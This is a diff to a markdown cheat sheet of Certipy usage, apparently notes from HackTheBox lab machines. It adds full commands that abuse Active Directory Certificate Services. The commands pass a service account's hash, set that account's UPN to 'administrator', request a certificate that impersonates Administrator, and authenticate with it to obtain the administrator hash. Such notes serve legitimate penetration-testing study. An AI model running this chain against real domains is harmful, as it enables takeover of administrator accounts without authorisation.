@@ -4,11 +4,24 @@
 
 ## Usage
 
+### Account
+
+Change the UPN of target user:
+
+```shell
+certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.179.157 -upn 'administrator' -user 'ca_svc' update
+```
+
 ### Auth
 
 Return a hash for the account of the private key
 
-Example: certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.129.251.172
+```shell
+certipy auth -pfx ./administrator.pfx -dc-ip 10.129.251.172
+```
+```shell
+faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" certipy auth -dc-ip '10.129.179.157' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+```
 
 ### Find
 
@@ -46,7 +59,15 @@ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-i
 
 ### Req
 
-Example: certipy-ad req -u ca_svc -hashes :{ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
+Request a certificate:
+
+```shell
+KRB5CCNAME=$PWD/ca_svc.ccache faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" certipy req -k -dc-host '10.129.179.157' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
+```
+
+```shell
+certipy req -u ca_svc -hashes :{ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
+```
 
 Might need to be run multiple times to work
 
